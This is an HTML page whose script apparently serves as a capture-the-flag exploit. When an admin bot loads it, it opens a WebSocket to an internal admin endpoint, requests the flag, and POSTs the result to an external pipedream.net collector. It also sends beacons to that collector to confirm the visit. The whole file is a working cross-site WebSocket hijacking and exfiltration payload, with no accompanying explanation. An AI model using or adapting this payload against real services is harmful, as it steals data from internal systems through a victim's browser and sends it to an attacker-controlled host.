<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flag Retrieval</title>
</head>
<body>
    <script>
        // Logging interaction with RequestBin to confirm bot access
        fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "Bot accessed HTML page" })
        });

        // WebSocket connection to retrieve flag
        const ws = new WebSocket('ws://web:8080/admin/ws');


        ws.onopen = () => {
            fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ message: "Opened?" })
             });
          console.log('WebSocket connection established!');
          ws.send('flag');
        };

        ws.onmessage = (event) => {
          const flag = event.data;
          console.log("Flag:", flag);
        
          // Send the flag back to RequestBin
          fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ flag: flag })
          });
        
          ws.close();
        };
    </script>
</body>
</html>
